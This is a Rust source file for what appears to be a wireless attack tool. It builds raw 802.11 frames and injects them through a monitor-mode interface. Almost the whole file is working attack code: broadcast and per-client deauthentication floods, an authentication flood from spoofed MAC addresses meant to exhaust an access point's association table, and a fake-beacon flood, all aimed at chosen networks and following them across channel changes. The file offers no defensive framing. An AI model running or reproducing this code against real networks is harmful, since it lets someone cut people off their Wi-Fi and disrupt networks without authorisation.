use anyhow::{Context, Result};
#[cfg(target_os = "linux")]
use pcap::{Capture, Device};
use std::sync::mpsc;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::time::Duration;

#[cfg(target_os = "linux")]
use crate::types::DeauthScope;
#[cfg(target_os = "linux")]
use crate::types::{Band, channel_to_freq_mhz};
use crate::types::{AttackCommand, AttackEvent, AttackMode, AttackType, Target};

// ── Shared helpers ────────────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
struct TargetState {
    bssid: String,
    #[allow(dead_code)]
    ssid: String,
    band: Band,
    channel: u8,
    active: bool,
    deauth_count: u64,
    scope: DeauthScope,
    client_filter: Vec<String>,
}

#[cfg(target_os = "linux")]
impl TargetState {
    fn from_target(t: &Target) -> Self {
        TargetState {
            bssid: t.bssid.clone(),
            ssid: t.ssid.clone(),
            band: t.band,
            channel: t.channel,
            active: t.active,
            deauth_count: 0,
            scope: DeauthScope::Broadcast,
            client_filter: t.client_filter.clone(),
        }
    }
}

#[cfg(target_os = "linux")]
fn rebuild_target_states(old: &[TargetState], new_targets: &[Target]) -> Vec<TargetState> {
    new_targets
        .iter()
        .map(|t| {
            let prev = old.iter().find(|s| s.bssid == t.bssid);
            TargetState {
                bssid: t.bssid.clone(),
                ssid: t.ssid.clone(),
                band: t.band,
                channel: t.channel,
                active: t.active,
                deauth_count: prev.map(|s| s.deauth_count).unwrap_or(0),
                scope: prev
                    .map(|s| s.scope.clone())
                    .unwrap_or(DeauthScope::Broadcast),
                client_filter: t.client_filter.clone(),
            }
        })
        .collect()
}

// ── Linux implementation ──────────────────────────────────────────────────────

/// Start the attack orchestrator in a separate thread
#[cfg(target_os = "linux")]
pub fn start_attack(
    mon_iface: &str,
    targets: Vec<Target>,
    mode: AttackMode,
    attack_type: AttackType,
    burst_size: u16,
    send_interval_ms: u64,
    attack_tx: mpsc::Sender<AttackEvent>,
    cmd_rx: mpsc::Receiver<AttackCommand>,
    running: Arc<AtomicBool>,
) -> Result<std::thread::JoinHandle<()>> {
    let iface = mon_iface.to_string();

    let handle = std::thread::Builder::new()
        .name("attack".into())
        .spawn(move || {
            let mut sender = match open_packet_sender(&iface) {
                Ok(s) => s,
                Err(e) => {
                    let _ = attack_tx.send(AttackEvent::Error(format!(
                        "Failed to open packet sender: {}",
                        e
                    )));
                    return;
                }
            };

            let _ = attack_tx.send(AttackEvent::Error(format!(
                "Attack started: {} {} mode, {} targets",
                attack_type.label(),
                if mode == AttackMode::RoundRobin {
                    "round-robin"
                } else {
                    "parallel"
                },
                targets.len()
            )));

            let mut burst_size = burst_size as usize;
            let rr_interval = Duration::from_millis(20);
            let mut burst_interval = Duration::from_millis(send_interval_ms);

            let mut target_states: Vec<TargetState> =
                targets.iter().map(TargetState::from_target).collect();
            let mut current_ch = 0u8;
            let mut current_band = Band::TwoGHz;

            match mode {
                AttackMode::RoundRobin => {
                    let mut target_idx = 0;
                    while running.load(Ordering::Relaxed) {
                        // Drain command queue
                        while let Ok(cmd) = cmd_rx.try_recv() {
                            match cmd {
                                AttackCommand::UpdateTargets(new_ts) => {
                                    target_states =
                                        rebuild_target_states(&target_states, &new_ts);
                                    let _ = attack_tx.send(AttackEvent::Error(format!(
                                        "Targets updated: {} active",
                                        target_states.iter().filter(|s| s.active).count()
                                    )));
                                }
                                AttackCommand::UpdateScope(scope) => {
                                    for state in &mut target_states {
                                        state.scope = scope.clone();
                                    }
                                }
                                AttackCommand::UpdateTargetChannel { bssid, channel, band } => {
                                    if let Some(state) = target_states.iter_mut().find(|s| s.bssid == bssid) {
                                        state.channel = channel;
                                        state.band = band;
                                        let _ = attack_tx.send(AttackEvent::Error(format!(
                                            "Pursuit: {} → ch {} {}", bssid, channel, band.label()
                                        )));
                                    }
                                }
                                AttackCommand::UpdateSettings { burst_size: new_b, send_interval_ms: new_i } => {
                                    burst_size = new_b as usize;
                                    burst_interval = Duration::from_millis(new_i);
                                }
                            }
                        }

                        if target_states.is_empty() {
                            std::thread::sleep(Duration::from_millis(100));
                            continue;
                        }

                        let idx = target_idx % target_states.len();

                        if target_states[idx].active {
                            let ch = target_states[idx].channel;
                            let band = target_states[idx].band;
                            let bssid = target_states[idx].bssid.clone();
                            let scope = target_states[idx].scope.clone();
                            let client_filter = target_states[idx].client_filter.clone();

                            if ch > 0 && (ch != current_ch || band != current_band) {
                                let _ = set_channel(&iface, ch, band);
                                current_ch = ch;
                                current_band = band;
                            }

                            for _ in 0..burst_size {
                                match attack_type {
                                    AttackType::AuthDos => {
                                        send_auth_dos_frame(&mut sender, &bssid);
                                    }
                                    AttackType::Deauth => {
                                        if !client_filter.is_empty() {
                                            for mac in &client_filter {
                                                send_client_deauth(&mut sender, &bssid, mac);
                                            }
                                        } else {
                                            match &scope {
                                                DeauthScope::Broadcast => {
                                                    send_deauth_frame(&mut sender, &bssid);
                                                }
                                                DeauthScope::Client { client_mac } => {
                                                    send_client_deauth(&mut sender, &bssid, client_mac);
                                                }
                                            }
                                        }
                                    }
                                    AttackType::BeaconFlood => {
                                        send_beacon_flood_frame(&mut sender, ch);
                                    }
                                }
                                target_states[idx].deauth_count += 1;
                                std::thread::sleep(Duration::from_millis(1));
                            }

                            let _ = attack_tx.send(AttackEvent::DeauthSent {
                                bssid,
                                count: target_states[idx].deauth_count,
                            });
                        }

                        target_idx += 1;
                        std::thread::sleep(rr_interval);
                    }
                }
                AttackMode::Parallel => {
                    while running.load(Ordering::Relaxed) {
                        // Drain command queue
                        while let Ok(cmd) = cmd_rx.try_recv() {
                            match cmd {
                                AttackCommand::UpdateTargets(new_ts) => {
                                    target_states =
                                        rebuild_target_states(&target_states, &new_ts);
                                    let _ = attack_tx.send(AttackEvent::Error(format!(
                                        "Targets updated: {} active",
                                        target_states.iter().filter(|s| s.active).count()
                                    )));
                                }
                                AttackCommand::UpdateScope(scope) => {
                                    for state in &mut target_states {
                                        state.scope = scope.clone();
                                    }
                                }
                                AttackCommand::UpdateTargetChannel { bssid, channel, band } => {
                                    if let Some(state) = target_states.iter_mut().find(|s| s.bssid == bssid) {
                                        state.channel = channel;
                                        state.band = band;
                                        let _ = attack_tx.send(AttackEvent::Error(format!(
                                            "Pursuit: {} → ch {} {}", bssid, channel, band.label()
                                        )));
                                    }
                                }
                                AttackCommand::UpdateSettings { burst_size: new_b, send_interval_ms: new_i } => {
                                    burst_size = new_b as usize;
                                    burst_interval = Duration::from_millis(new_i);
                                }
                            }
                        }

                        if target_states.is_empty() {
                            std::thread::sleep(Duration::from_millis(100));
                            continue;
                        }

                        for idx in 0..target_states.len() {
                            if !target_states[idx].active {
                                continue;
                            }

                            let ch = target_states[idx].channel;
                            let band = target_states[idx].band;
                            if ch > 0 && (ch != current_ch || band != current_band) {
                                let _ = set_channel(&iface, ch, band);
                                current_ch = ch;
                                current_band = band;
                            }

                            let bssid = target_states[idx].bssid.clone();
                            let scope = target_states[idx].scope.clone();
                            let client_filter = target_states[idx].client_filter.clone();
                            let ch = target_states[idx].channel;
                            for _ in 0..burst_size {
                                match attack_type {
                                    AttackType::AuthDos => {
                                        send_auth_dos_frame(&mut sender, &bssid);
                                    }
                                    AttackType::Deauth => {
                                        if !client_filter.is_empty() {
                                            for mac in &client_filter {
                                                send_client_deauth(&mut sender, &bssid, mac);
                                            }
                                        } else {
                                            match &scope {
                                                DeauthScope::Broadcast => {
                                                    send_deauth_frame(&mut sender, &bssid);
                                                }
                                                DeauthScope::Client { client_mac } => {
                                                    send_client_deauth(&mut sender, &bssid, client_mac);
                                                }
                                            }
                                        }
                                    }
                                    AttackType::BeaconFlood => {
                                        send_beacon_flood_frame(&mut sender, ch);
                                    }
                                }
                                target_states[idx].deauth_count += 1;
                            }
                        }

                        for state in &target_states {
                            if state.active {
                                let _ = attack_tx.send(AttackEvent::DeauthSent {
                                    bssid: state.bssid.clone(),
                                    count: state.deauth_count,
                                });
                            }
                        }

                        std::thread::sleep(burst_interval);
                    }
                }
            }
        })
        .context("Failed to spawn attack thread")?;

    Ok(handle)
}

#[cfg(target_os = "linux")]
fn set_channel(iface: &str, channel: u8, band: Band) -> Result<()> {
    let freq = channel_to_freq_mhz(channel, band);
    std::process::Command::new("iw")
        .args(["dev", iface, "set", "freq", &freq.to_string()])
        .output()
        .context(format!("Failed to set freq {} MHz on {}", freq, iface))?;
    Ok(())
}

#[cfg(target_os = "linux")]
fn open_packet_sender(iface: &str) -> Result<pcap::Capture<pcap::Active>> {
    let devices = Device::list().context("Failed to list pcap devices")?;

    let device = devices.iter().find(|d| d.name == *iface);

    let cap = match device {
        Some(dev) => Capture::from_device(dev.name.as_str())
            .context("Failed to create capture device for sending")?
            .promisc(true)
            .snaplen(65535)
            .immediate_mode(true)
            .open()
            .context("Failed to open capture for sending")?,
        None => Capture::from_device(iface)
            .context("Failed to create capture from device name")?
            .promisc(true)
            .snaplen(65535)
            .immediate_mode(true)
            .open()
            .context("Failed to open capture for sending")?,
    };

    Ok(cap)
}

/// Send broadcast deauth to all clients of an AP
#[cfg(target_os = "linux")]
fn send_deauth_frame(cap: &mut pcap::Capture<pcap::Active>, bssid_str: &str) {
    let bssid = parse_mac(bssid_str);
    let broadcast = [0xFFu8; 6];
    static mut SEQ: u16 = 0;

    let seq = unsafe {
        SEQ = SEQ.wrapping_add(1);
        SEQ
    };

    let frame_control: u16 = 0x00C0;
    let duration: u16 = 0x0000;

    let mut frame = Vec::with_capacity(26);
    frame.extend_from_slice(&frame_control.to_le_bytes());
    frame.extend_from_slice(&duration.to_le_bytes());
    frame.extend_from_slice(&broadcast);
    frame.extend_from_slice(&bssid);
    frame.extend_from_slice(&bssid);
    frame.extend_from_slice(&seq.to_le_bytes());
    frame.extend_from_slice(&0x0007u16.to_le_bytes());

    let mut packet = Vec::with_capacity(8 + frame.len());
    packet.extend_from_slice(&build_radiotap_header());
    packet.extend_from_slice(&frame);

    let _ = cap.sendpacket(&*packet);
}

/// Send targeted deauth — kick a specific client from an AP (both directions)
#[cfg(target_os = "linux")]
fn send_client_deauth(cap: &mut pcap::Capture<pcap::Active>, ap_bssid: &str, client_mac: &str) {
    let bssid = parse_mac(ap_bssid);
    let client = parse_mac(client_mac);
    static mut SEQ: u16 = 0;

    let seq = unsafe {
        SEQ = SEQ.wrapping_add(1);
        SEQ
    };

    let frame_control: u16 = 0x00C0;
    let duration: u16 = 0x0000;

    let mut frame = Vec::with_capacity(26);
    frame.extend_from_slice(&frame_control.to_le_bytes());
    frame.extend_from_slice(&duration.to_le_bytes());
    frame.extend_from_slice(&client);
    frame.extend_from_slice(&bssid);
    frame.extend_from_slice(&bssid);
    frame.extend_from_slice(&seq.to_le_bytes());
    frame.extend_from_slice(&0x0007u16.to_le_bytes());

    let mut frame2 = Vec::with_capacity(26);
    frame2.extend_from_slice(&frame_control.to_le_bytes());
    frame2.extend_from_slice(&duration.to_le_bytes());
    frame2.extend_from_slice(&bssid);
    frame2.extend_from_slice(&client);
    frame2.extend_from_slice(&bssid);
    frame2.extend_from_slice(&seq.to_le_bytes());
    frame2.extend_from_slice(&0x0007u16.to_le_bytes());

    let radiotap = build_radiotap_header();

    let mut packet1 = Vec::with_capacity(8 + frame.len());
    packet1.extend_from_slice(&radiotap);
    packet1.extend_from_slice(&frame);

    let mut packet2 = Vec::with_capacity(8 + frame2.len());
    packet2.extend_from_slice(&build_radiotap_header());
    packet2.extend_from_slice(&frame2);

    let _ = cap.sendpacket(&*packet1);
    let _ = cap.sendpacket(&*packet2);
}

/// Flood AP with auth frames from random source MACs — exhausts AP association table
#[cfg(target_os = "linux")]
fn send_auth_dos_frame(cap: &mut pcap::Capture<pcap::Active>, bssid_str: &str) {
    let bssid = parse_mac(bssid_str);
    static mut AUTH_COUNTER: u64 = 0;
    static mut SEQ: u16 = 0;

    let (src_mac, seq) = unsafe {
        AUTH_COUNTER = AUTH_COUNTER.wrapping_add(1);
        SEQ = SEQ.wrapping_add(1);
        let c = AUTH_COUNTER;
        // Locally administered unicast MACs (bit 1 set, bit 0 clear of first byte)
        let mac = [
            0x02u8,
            ((c >> 32) & 0xFF) as u8,
            ((c >> 24) & 0xFF) as u8,
            ((c >> 16) & 0xFF) as u8,
            ((c >> 8) & 0xFF) as u8,
            (c & 0xFF) as u8,
        ];
        (mac, SEQ)
    };

    // 802.11 Auth frame: management type (0), subtype 11 (0b1011) → FC = 0x00B0
    let frame_control: u16 = 0x00B0;
    let duration: u16 = 0x013A;

    let mut frame = Vec::with_capacity(30);
    frame.extend_from_slice(&frame_control.to_le_bytes());
    frame.extend_from_slice(&duration.to_le_bytes());
    frame.extend_from_slice(&bssid);    // DA = AP
    frame.extend_from_slice(&src_mac);  // SA = spoofed client
    frame.extend_from_slice(&bssid);    // BSSID
    frame.extend_from_slice(&seq.to_le_bytes());
    // Auth body: Open System (0), seq=1, status=Success(0)
    frame.extend_from_slice(&0x0000u16.to_le_bytes());
    frame.extend_from_slice(&0x0001u16.to_le_bytes());
    frame.extend_from_slice(&0x0000u16.to_le_bytes());

    let mut packet = Vec::with_capacity(8 + frame.len());
    packet.extend_from_slice(&build_radiotap_header());
    packet.extend_from_slice(&frame);

    let _ = cap.sendpacket(&*packet);
}

/// Flood airspace with fake beacon frames — random SSIDs and BSSIDs
#[cfg(target_os = "linux")]
fn send_beacon_flood_frame(cap: &mut pcap::Capture<pcap::Active>, channel: u8) {
    use rand::Rng;
    let mut rng = rand::thread_rng();

    static mut SEQ: u16 = 0;
    let seq = unsafe {
        SEQ = SEQ.wrapping_add(1);
        SEQ
    };

    let fake_bssid: [u8; 6] = [
        0x02 | (rng.gen::<u8>() & 0xFE),
        rng.gen(), rng.gen(), rng.gen(), rng.gen(), rng.gen(),
    ];

    let ssid_len = rng.gen_range(6..=12usize);
    let ssid: Vec<u8> = (0..ssid_len).map(|_| rng.gen_range(0x41u8..=0x5Au8)).collect();

    let frame_control: u16 = 0x0080; // mgmt subtype 8 (beacon)
    let broadcast = [0xFFu8; 6];

    let mut frame = Vec::with_capacity(60);
    frame.extend_from_slice(&frame_control.to_le_bytes());
    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // duration
    frame.extend_from_slice(&broadcast);
    frame.extend_from_slice(&fake_bssid);
    frame.extend_from_slice(&fake_bssid);
    frame.extend_from_slice(&seq.to_le_bytes());
    frame.extend_from_slice(&[0u8; 8]);         // timestamp
    frame.extend_from_slice(&[0x64, 0x00]);     // beacon interval
    frame.extend_from_slice(&[0x01, 0x04]);     // capability: ESS
    frame.push(0x00); frame.push(ssid_len as u8); frame.extend_from_slice(&ssid);
    frame.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24]);
    frame.extend_from_slice(&[0x03, 0x01, channel]);

    let mut packet = Vec::with_capacity(8 + frame.len());
    packet.extend_from_slice(&build_radiotap_header());
    packet.extend_from_slice(&frame);
    let _ = cap.sendpacket(&*packet);
}

#[cfg(target_os = "linux")]
fn build_radiotap_header() -> Vec<u8> {
    vec![
        0x00, 0x00, // Version, Pad
        0x08, 0x00, // Length = 8
        0x02, 0x00, 0x00, 0x00, // Present: flags
        0x00, // Flags: no FCS
    ]
}

#[cfg(target_os = "linux")]
fn parse_mac(mac: &str) -> [u8; 6] {
    let mut result = [0u8; 6];
    let parts: Vec<&str> = mac.split(':').collect();
    for i in 0..6.min(parts.len()) {
        if let Ok(b) = u8::from_str_radix(parts[i], 16) {
            result[i] = b;
        }
    }
    result
}

#[allow(dead_code)]
pub fn reason_code_string(code: u16) -> &'static str {
    match code {
        0x0001 => "Unspecified reason",
        0x0004 => "Disassociated due to inactivity",
        0x0005 => "Disassociated because AP is unable to handle all currently associated STAs",
        0x0006 => "Class 2 frame received from nonauthenticated STA",
        0x0007 => "Class 3 frame received from nonassociated STA",
        0x0008 => "Disassociated because sending STA is leaving BSS",
        0x0009 => "STA requesting (re)association is not authenticated with responding STA",
        _ => "Unknown reason",
    }
}

// ── Stub implementation (non-Linux / macOS dev) ───────────────────────────────

#[cfg(not(target_os = "linux"))]
pub fn start_attack(
    _mon_iface: &str,
    targets: Vec<Target>,
    mode: AttackMode,
    attack_type: AttackType,
    burst_size: u16,
    send_interval_ms: u64,
    attack_tx: mpsc::Sender<AttackEvent>,
    cmd_rx: mpsc::Receiver<AttackCommand>,
    running: Arc<AtomicBool>,
) -> Result<std::thread::JoinHandle<()>> {
    let handle = std::thread::Builder::new()
        .name("attack-stub".into())
        .spawn(move || {
            let _ = attack_tx.send(AttackEvent::Error(format!(
                "[STUB] Attack started: {} {} mode, {} targets",
                attack_type.label(),
                if mode == AttackMode::RoundRobin { "round-robin" } else { "parallel" },
                targets.len()
            )));

            // Track deauth counts per BSSID: Vec<(bssid, count)>
            let mut counts: Vec<(String, u64)> = targets
                .iter()
                .map(|t| (t.bssid.clone(), 0u64))
                .collect();
            let mut active: Vec<bool> = targets.iter().map(|t| t.active).collect();

            let mut burst_interval = Duration::from_millis(send_interval_ms);
            let mut burst_size = burst_size as u64;

            while running.load(Ordering::Relaxed) {
                // Drain command queue
                while let Ok(cmd) = cmd_rx.try_recv() {
                    match cmd {
                        AttackCommand::UpdateTargets(new_ts) => {
                            counts = new_ts.iter().map(|t| {
                                let prev = counts.iter().find(|(b, _)| b == &t.bssid)
                                    .map(|(_, c)| *c)
                                    .unwrap_or(0);
                                (t.bssid.clone(), prev)
                            }).collect();
                            active = new_ts.iter().map(|t| t.active).collect();
                            let _ = attack_tx.send(AttackEvent::Error(format!(
                                "[STUB] Targets updated: {} active",
                                active.iter().filter(|&&a| a).count()
                            )));
                        }
                        AttackCommand::UpdateScope(_) => {}
                        AttackCommand::UpdateTargetChannel { bssid, channel, band } => {
                            let _ = attack_tx.send(AttackEvent::Error(format!(
                                "[STUB] Pursuit: {} → ch {} {}", bssid, channel, band.label()
                            )));
                        }
                        AttackCommand::UpdateSettings { burst_size: new_b, send_interval_ms: new_i } => {
                            burst_size = new_b as u64;
                            burst_interval = Duration::from_millis(new_i);
                        }
                    }
                }

                if counts.is_empty() {
                    std::thread::sleep(Duration::from_millis(100));
                    continue;
                }

                for i in 0..counts.len() {
                    if !active.get(i).copied().unwrap_or(false) {
                        continue;
                    }
                    counts[i].1 += burst_size;
                    let _ = attack_tx.send(AttackEvent::DeauthSent {
                        bssid: counts[i].0.clone(),
                        count: counts[i].1,
                    });
                }

                std::thread::sleep(burst_interval);
            }
        })
        .context("Failed to spawn attack stub thread")?;

    Ok(handle)
}
